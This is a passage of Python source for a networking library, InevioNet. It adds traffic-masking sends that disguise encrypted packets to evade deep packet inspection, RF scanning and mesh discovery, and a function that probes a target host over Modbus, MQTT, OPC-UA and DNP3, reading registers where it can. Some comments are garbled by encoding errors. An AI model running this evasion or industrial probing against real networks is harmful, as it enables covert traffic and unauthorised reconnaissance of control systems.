    if not hasattr(self, '_masking_engine') or self._masking_engine is None:
        self._masking_engine = MaskingEngine(dpi_profile=dpi_profile)
    self.masking_enabled = True
    logger.info(f"Masking enabled (DPI: {dpi_profile})")
    return self._masking_engine


def _disable_masking_impl(self):
    self.masking_enabled = False
    logger.info("Masking disabled")


def _masking_property(self):
    if not hasattr(self, '_masking_engine') or self._masking_engine is None:
        self.enable_masking()
    return self._masking_engine


def _probe_node_impl(self, node):
    if not hasattr(self, 'masking_enabled') or not self.masking_enabled:
        self.enable_masking()
    return self._masking_engine.probe_node(node)


def _send_masked_impl(self, receiver, payload, polymorphic=False, context=None):
    if not hasattr(self, 'masking_enabled') or not self.masking_enabled:
        self.enable_masking()
    data = self._prepare_payload(payload)
    encrypted = self.crypto.encrypt(data)
    packet = create_packet(
        sender=self.node_id, receiver=receiver,
        payload=encrypted, protocol="auto", priority=8)
    packet._is_encrypted = True
    packet.sign(self.crypto.get_signing_keypair().private_key)
    result = self._masking_engine.mask(
        packet, receiver, polymorphic=polymorphic, context=context)
    if result.success:
        self._masking_engine.learn_from_result(receiver, result.channel, True)
        return True, packet
    return False, packet


def _get_masking_stats_impl(self):
    if not hasattr(self, '_masking_engine') or self._masking_engine is None:
        return {}
    return self._masking_engine.get_stats()


# Bind to class
InevioNet.enable_masking = _enable_masking_impl
InevioNet.disable_masking = _disable_masking_impl
InevioNet.masking = property(_masking_property)
InevioNet.probe_node = _probe_node_impl
InevioNet.send_masked = _send_masked_impl
InevioNet.get_masking_stats = _get_masking_stats_impl


# ================================================================
# RF + MESH + AMBIENT РРќРўР•Р“Р РђР¦РРЇ
# ================================================================

def _enable_rf_scanning_impl(self, interface=None, wifi_provider=None):
    # P13: wifi_provider fix
    from .network.rf_scanner import RFScanner
    if not hasattr(self, '_rf_scanner') or self._rf_scanner is None:
        self._rf_scanner = RFScanner(
            interface=interface,
            wifi_provider=wifi_provider,
        )
        logger.info(f"RF scanning enabled: {self._rf_scanner}")
    return self._rf_scanner
def _enable_auto_topology_impl(self):
    from .mesh.auto_topology import AutoTopology
    if not hasattr(self, '_auto_topology') or self._auto_topology is None:
        scanner = self.enable_rf_scanning()
        self._auto_topology = AutoTopology(rf_scanner=scanner)
        logger.info(f"Auto topology enabled: {self._auto_topology}")
    return self._auto_topology


def _enable_ambient_masking_impl(self, adaptation_strength=0.7):
    from .masking.ambient import AmbientMasker
    if not hasattr(self, '_ambient_masker') or self._ambient_masker is None:
        self._ambient_masker = AmbientMasker(adaptation_strength=adaptation_strength)
        logger.info(f"Ambient masking enabled")
    return self._ambient_masker


def _enable_spatial_model_impl(self, density_per_km2=100.0, detection_range_km=0.1):
    from .masking.ambient import SpatialDensityModel
    if not hasattr(self, '_spatial_model') or self._spatial_model is None:
        self._spatial_model = SpatialDensityModel(
            density_per_km2=density_per_km2,
            detection_range_km=detection_range_km)
    return self._spatial_model


def _scan_environment_impl(self):
    scanner = self.enable_rf_scanning()
    result = scanner.scan_all()
    density = scanner.estimate_rf_density()
    return {
        "scan": {
            "success": result.success,
            "signals": result.total_count,
            "duration_ms": result.duration_ms,
            "method": result.method,
        },
        "density": density,
        "signals_by_type": {k: len(v) for k, v in result.by_type().items()},
    }


def _build_mesh_topology_impl(self, min_quality=0.3):
    topology = self.enable_auto_topology()
    build_info = topology.build_from_scanner(min_quality=min_quality)
    if not build_info.get("success"):
        return {"build": build_info}
    analysis = topology.analyze()
    return {
        "build": build_info,
        "analysis": analysis,
        "stats": topology.get_stats(),
    }


def _send_ambient_masked_impl(self, receiver, payload, learn_traffic=True):
    masker = self.enable_ambient_masking()
    data = self._prepare_payload(payload)
    encrypted = self.crypto.encrypt(data)
    packet = create_packet(
        sender=self.node_id, receiver=receiver,
        payload=encrypted, protocol="auto", priority=8)
    packet._is_encrypted = True
    packet.sign(self.crypto.get_signing_keypair().private_key)
    if learn_traffic:
        masker.observe(
            size=len(encrypted),
            protocol=packet.protocol,
            entropy=self._estimate_entropy(encrypted))
    target = self._resolve_target(receiver)
    result = self.transport.send(
        data=packet.to_bytes(), protocol="HTTP", target=target)
    success = result.success
    if success:
        self.mycelium.record_success(receiver, receiver, "ambient")
    return success, packet


def _estimate_environment_density_impl(self, density_per_km2=None):
    scanner = self.enable_rf_scanning()
    density_info = scanner.estimate_rf_density()
    if density_per_km2 is None:
        density_per_km2 = density_info.get("total_density", 100.0)
    model = self.enable_spatial_model(
        density_per_km2=density_per_km2,
        detection_range_km=0.1)
    return model.analyze(area_km2=1.0)


def _get_aggregated_stats_impl(self):
    from .core.stats_aggregator import StatsAggregator
    if not hasattr(self, '_stats_aggregator') or self._stats_aggregator is None:
        self._stats_aggregator = StatsAggregator()
    agg = self._stats_aggregator
    agg.register("transport", self.transport)
    if hasattr(self, '_masking_engine') and self._masking_engine:
        agg.register("masking", self._masking_engine)
    if hasattr(self, '_rf_scanner') and self._rf_scanner:
        agg.register("rf_scanner", self._rf_scanner)
    if hasattr(self, '_auto_topology') and self._auto_topology:
        agg.register("topology", self._auto_topology)
    if hasattr(self, '_ambient_masker') and self._ambient_masker:
        agg.register("ambient", self._ambient_masker)
    agg.register("mycelium", self.mycelium)
    agg.register("evolution", self.evolution)
    agg.register("selector", self.selector)
    return agg.get_all()


def _get_summary_stats_impl(self):
    return self._get_aggregated_stats_impl()["summary"]


def _export_full_stats_impl(self):
    agg = self._stats_aggregator
    return agg.export_json()


InevioNet.enable_rf_scanning = _enable_rf_scanning_impl
InevioNet.enable_auto_topology = _enable_auto_topology_impl
InevioNet.enable_ambient_masking = _enable_ambient_masking_impl
InevioNet.enable_spatial_model = _enable_spatial_model_impl
InevioNet.scan_environment = _scan_environment_impl
InevioNet.build_mesh_topology = _build_mesh_topology_impl
InevioNet.send_ambient_masked = _send_ambient_masked_impl
InevioNet.estimate_environment_density = _estimate_environment_density_impl
InevioNet.get_aggregated_stats = _get_aggregated_stats_impl
InevioNet.get_summary_stats = _get_summary_stats_impl
InevioNet.export_full_stats = _export_full_stats_impl


# ================================================================
# IDENTITY + TRUST
# ================================================================

def _get_identity_info(self):
    if not hasattr(self, "_identity") or self._identity is None:
        return {
            "device_id": self.node_id,
            "device_type": "unknown", "role": "peer",
            "nickname": self.node_id,
            "registry_stats": {"total_devices": 0},
            "trust_stats": {"total_records": 0},
            "presence_stats": {"total": 0},
        }
    return {
        "device_id": self._identity.device_id.device_id,
        "device_type": self._identity.device_id.device_type.value,
        "role": self._identity.device_id.role.value,
        "nickname": self._identity.device_id.nickname,
        "registry_stats": self._registry.get_stats() if hasattr(self, "_registry") else {},
        "trust_stats": self._trust.get_stats() if hasattr(self, "_trust") else {},
        "presence_stats": self._presence.get_stats() if hasattr(self, "_presence") else {},
    }


def _enable_identity(self, device_type="endpoint", nickname=None):
    return self._ensure_identity()


def _record_interaction(self, device_id, success):
    if not hasattr(self, "_trust") or self._trust is None:
        self._ensure_identity()
    self._trust.record_interaction(
        self._identity.device_id.device_id, device_id, success)


def _get_trust(self, device_id):
    if not hasattr(self, "_trust") or self._trust is None:
        self._ensure_identity()
    return self._trust.get_trust(
        self._identity.device_id.device_id, device_id)


InevioNet.get_identity_info = _get_identity_info
InevioNet.enable_identity = _enable_identity
InevioNet.record_interaction = _record_interaction
InevioNet.get_trust = _get_trust


# ================================================================
# get_discovered_nodes
# ================================================================
def get_discovered_nodes(self):
    import time as _t
    nodes = {}
    nodes[self.node_id] = {
        'node_id': self.node_id, 'name': 'self', 'type': 'self',
        'ip': '127.0.0.1', 'port': 8800, 'trust': 100.0,
        'packets': self.stats.get('packets_sent', 0) if hasattr(self, 'stats') else 0,
        'online': True, 'rssi': -30, 'method': 'local', 'last_seen': _t.time(),
    }
    if hasattr(self, '_rf_scanner') and self._rf_scanner:
        try:
            scan = self._rf_scanner.scan_all()
            for sig in scan.get('signals', []):
                sig_id = sig.get('identifier', sig.get('ssid', sig.get('mac', '')))
                if not sig_id: continue
                nodes[f"rf_{sig_id}"] = {
                    'node_id': f"rf_{sig_id}",
                    'name': sig.get('ssid', sig.get('name', sig_id)),
                    'type': sig.get('type', 'unknown'),
                    'ip': 'unknown', 'port': 0,
                    'trust': min(100, max(10, 50 + sig.get('rssi_dbm', -80))),
                    'packets': 0, 'online': True,
                    'rssi': sig.get('rssi_dbm', -90),
                    'method': 'rf_scan', 'last_seen': _t.time(),
                }
        except Exception:
            pass
    try:
        for peer in self.get_discovered_peers():
            pid = peer.get('device_id', '')
            if pid and pid != self.node_id:
                nodes[pid] = {
                    'node_id': pid,
                    'name': peer.get('nickname') or pid[:12],
                    'type': 'peer',
                    'ip': (peer.get('endpoint') or '').split(':')[0] or 'unknown',
                    'port': 9555, 'trust': 60.0, 'packets': 0,
                    'online': True, 'rssi': -60,
                    'method': 'discovery',
                    'last_seen': peer.get('timestamp', _t.time()),
                }
    except Exception:
        pass
    try:
        from inevionet.users import get_user_manager
        um = get_user_manager()
        for contact in um.get_contacts():
            cid = contact.get('node_id', '')
            if cid and cid not in nodes:
                nodes[cid] = {
                    'node_id': cid,
                    'name': contact.get('username', 'contact'),
                    'type': 'contact',
                    'ip': contact.get('ip', 'unknown'),
                    'port': contact.get('port', 0),
                    'trust': contact.get('trust', 50.0),
                    'packets': contact.get('packets', 0),
                    'online': False, 'rssi': -70,
                    'method': 'contact',
                    'last_seen': contact.get('added_at', _t.time()),
                }
    except Exception:
        pass
    # P12-Fix-6: РІ __init__ СЃРѕР·РґР°С‘С‚СЃСЏ self.mycelium, Р° РЅРµ _mycelium
    if hasattr(self, 'mycelium') and self.mycelium:
        try:
            spores = self.mycelium.get_spores()
            for i, spore in enumerate(spores[:10]):
                spore_id = f"spore_{spore.get('target_network', 'unknown')}_{i}"
                nodes[spore_id] = {
                    'node_id': spore_id,
                    'name': f"Spore:{spore.get('target_network', '?')}",
                    'type': 'spore', 'ip': 'spore', 'port': 0,
                    'trust': 30.0,
                    'packets': spore.get('cached_packets', 0),
                    'online': True, 'rssi': -80,
                    'method': 'mycelium', 'last_seen': _t.time(),
                }
        except Exception:
            pass
    return nodes


def _scan_industrial_impl(self, target, timeout=3.0):
    """P13: Р РЋР С“Р В РЎвЂќР В Р’В°Р В Р вЂ¦Р В РЎвЂР РЋР вЂљР В РЎвЂўР В Р вЂ Р В Р’В°Р В Р вЂ¦Р В РЎвЂР В Р’Вµ Р В РЎвЂ”Р РЋР вЂљР В РЎвЂўР В РЎВР РЋРІР‚в„–Р РЋРІвЂљВ¬Р В Р’В»Р В Р’ВµР В Р вЂ¦Р В Р вЂ¦Р РЋРІР‚в„–Р РЋРІР‚В¦ Р В РЎвЂ”Р РЋР вЂљР В РЎвЂўР РЋРІР‚С™Р В РЎвЂўР В РЎвЂќР В РЎвЂўР В Р’В»Р В РЎвЂўР В Р вЂ ."""
    results = {}
    host = target.split(":")[0]

    # Modbus
    try:
        from .industrial.modbus import ModbusTCP
        mb = ModbusTCP(target_host=host, target_port=502, timeout=timeout)
        regs = mb.read_holding_registers(slave=1, address=0, count=4)
        results["modbus"] = {
            "found": bool(regs),
            "registers": regs or [],
        }
    except Exception as e:
        results["modbus"] = {"found": False, "error": str(e)}

    # MQTT
    try:
        from .industrial.mqtt import MQTTClient, PAHO_AVAILABLE
        if PAHO_AVAILABLE:
            mc = MQTTClient(target_host=host, target_port=1883, timeout=timeout)
            ok = mc.connect()
            mc.disconnect()
            results["mqtt"] = {"found": ok}
        else:
            results["mqtt"] = {"found": False, "error": "paho-mqtt not installed"}
    except Exception as e:
        results["mqtt"] = {"found": False, "error": str(e)}

    # OPC-UA
    try:
        from .industrial.opcua import OPCUA
        oc = OPCUA(endpoint=f"opc.tcp://{host}:4840", timeout=timeout)
        results["opcua"] = {"found": True, "note": "packet built"}
    except Exception as e:
        results["opcua"] = {"found": False, "error": str(e)}

    # DNP3
    try:
        from .industrial.dnp3 import DNP3
        d = DNP3(target_host=host, target_port=20000, timeout=timeout)
        pkt = d.wrap_for_inevionet(0x01, destination=1, address=0, count=1)
        results["dnp3"] = {"found": bool(pkt), "packet_size": len(pkt.data)}
        d.close()
    except Exception as e:
        results["dnp3"] = {"found": False, "error": str(e)}

    return results


InevioNet.scan_industrial = _scan_industrial_impl
InevioNet.get_discovered_nodes = get_discovered_nodes